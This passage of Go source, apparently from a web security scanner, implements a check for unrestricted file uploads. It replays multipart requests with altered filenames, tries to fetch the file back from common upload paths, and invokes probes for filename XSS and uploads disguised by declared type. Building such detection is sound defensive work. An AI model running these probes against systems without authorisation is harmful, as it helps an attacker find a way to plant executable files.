			// is written to a temporary directory, or renamed, or kept out of reach — and
			// none of those is the finding. The finding is a file that ends up served,
			// so the file has to be fetched back before the name means anything.
			if !uploadRetrieved(ctx, c, t, form, filename) {
				continue
			}

			f := checks.NewFinding(unsafeUpload{}, t,
				i18n.KeyCheckUploadTitle, i18n.KeyCheckUploadDesc, i18n.KeyCheckUploadFix)
			f.Severity = finding.SeverityMedium
			f.Confidence = group.confidence
			f.Method = mutated.Method
			f.URL = mutated.URLString()
			f.Payload = filename
			f.CWE = "CWE-434"
			f.References = []string{
				"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
				"https://cwe.mitre.org/data/definitions/434.html",
			}
			f.Evidence.Request = mutated.Raw()
			f.Evidence.Response = truncate(response.Body, 8192)
			f.Evidence.Baseline = truncate(t.Response.Body, 4096)
			f.Evidence.Matches = []string{
				group.kind + ": " + filename,
				fmt.Sprintf("the response matched the genuine upload (%s)", round3(similarity)),
			}
			return []*finding.Finding{f}
		}
	}

	// A name that is merely rendered is still a stored script.
	if f := uploadFilenameXSS(ctx, c, t, form); f != nil {
		return []*finding.Finding{f}
	}
	// Last: the same dangerous names, behind a declared type and a file header. An endpoint
	// that refuses the plain ones and accepts these has a check that states a belief rather
	// than one that holds.
	if f := uploadDisguise(ctx, c, t, form, base); f != nil {
		return []*finding.Finding{f}
	}
	return nil
}

// uploadForm is the structure of a multipart request, kept so it can be rebuilt
// with a different filename.
type uploadForm struct {
	fields    []httpmsg.KV
	fileField string
	content   []byte
	// contentType overrides the part's declared type. An endpoint that judges a file by the
	// type it claims — rather than by what it is — is what a disguised upload is for.
	contentType string
}

// parseUploadForm extracts the fields and the uploaded part from a multipart
// request.
func parseUploadForm(req *httpmsg.Request) (*uploadForm, bool) {
	contentType := req.Header.Get("Content-Type")
	if !strings.Contains(strings.ToLower(contentType), "multipart/form-data") {
		return nil, false
	}
	mediaType, params, err := mime.ParseMediaType(contentType)
	if err != nil || !strings.HasPrefix(mediaType, "multipart/form-data") {
		return nil, false
	}
	boundary := params["boundary"]
	if boundary == "" || len(req.Body) == 0 {
		return nil, false
	}

	reader := multipart.NewReader(bytes.NewReader(req.Body), boundary)
	form := &uploadForm{}
	for {
		part, err := reader.NextPart()
		if err == io.EOF {
			break
		}
		if err != nil {
			// A body that cannot be parsed is not a failure worth reporting; it
			// just means this request is not one we can rebuild.
			return nil, false
		}
		name := part.FormName()
		if filename := part.FileName(); filename != "" {
			// The first file part is the one that gets replaced.
			if form.fileField == "" {
				form.fileField = name
				// Bounded read: an upload larger than this is not one we want
				// to replay anyway.
				form.content, _ = io.ReadAll(io.LimitReader(part, 1<<20))
			}
			_ = part.Close()
			continue
		}
		value, _ := io.ReadAll(io.LimitReader(part, 1<<16))
		form.fields = append(form.fields, httpmsg.KV{Name: name, Value: string(value)})
		_ = part.Close()
	}
	if form.fileField == "" {
		return nil, false
	}
	return form, true
}

// build renders the form again with a different filename.
//
// Fields are emitted in a stable order so that two runs against the same target
// produce byte-identical requests, which is what makes a result reproducible.
func (f *uploadForm) build(filename string) ([]byte, string) {
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	fields := append([]httpmsg.KV(nil), f.fields...)
	sort.SliceStable(fields, func(i, j int) bool { return fields[i].Name < fields[j].Name })
	for _, field := range fields {
		_ = writer.WriteField(field.Name, field.Value)
	}

	part, err := f.createPart(writer, filename)
	if err == nil {
		_, _ = part.Write(f.content)
	}
	_ = writer.Close()
	return buf.Bytes(), writer.FormDataContentType()
}

// sendUpload rebuilds a multipart request with a new filename and sends it.
// uploadRetrieved reports whether the file just uploaded can be fetched back.
//
// Where a target puts an upload is its own business, so the places worth asking are the
// directory the form posts to and the conventional ones beside it. Failing all of them does not
// prove the file is harmless — it proves this check could not see it, which is exactly when a
// name-based claim would be a guess.
func uploadRetrieved(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm, filename string) bool {
	for _, path := range uploadRetrievalPaths(t, form, filename) {
		fetched, err := fetchPath(ctx, c, t, path)
		if err != nil || fetched == nil || fetched.Status != 200 {
			continue
		}
		if bytes.Contains(fetched.Body, uploadContentMarker) {
			return true
		}
	}
	return false
}

// uploadRetrievalPaths are the addresses the written file might answer on.
func uploadRetrievalPaths(t *checks.Target, form *uploadForm, filename string) []string {
	names := []string{filename}
	// A target may keep only the base name of what it was given.
	if index := strings.LastIndexAny(filename, `\/`); index >= 0 {
		names = append(names, filename[index+1:])
	}

	dirs := []string{"/uploads", "/upload", "/files", "/up", "/"}
	// The directory the form posts to is the likeliest place, and it is knowable: the
	// request being replayed was addressed to it.
	if t != nil && t.Request != nil && t.Request.URL != nil {
		if dir := path.Dir(t.Request.URL.Path); dir != "" {
			dirs = append([]string{dir}, dirs...)
		}
	}

	var out []string
	seen := map[string]bool{}
	for _, dir := range dirs {
		for _, name := range names {
			path := strings.TrimSuffix(dir, "/") + "/" + name
			if !strings.HasPrefix(path, "/") {
				path = "/" + path
			}
			if seen[path] {
				continue
			}
			seen[path] = true
			out = append(out, path)
		}
	}
	return out
}

func sendUpload(ctx context.Context, c *checks.Context, t *checks.Target, form *uploadForm, filename string) (*httpmsg.Request, *httpmsg.Response, error) {
	body, contentType := form.build(filename)

	mutated := t.Request.Clone()
	mutated.Body = body
	mutated.Header.Set("Content-Type", contentType)
	mutated.Header.Set("Content-Length", fmt.Sprint(len(body)))
	mutated.Origin = httpmsg.OriginReplay

	response, err := c.Do(ctx, mutated)
	if err != nil {
		return nil, nil, err
	}
	return mutated, response, nil
}
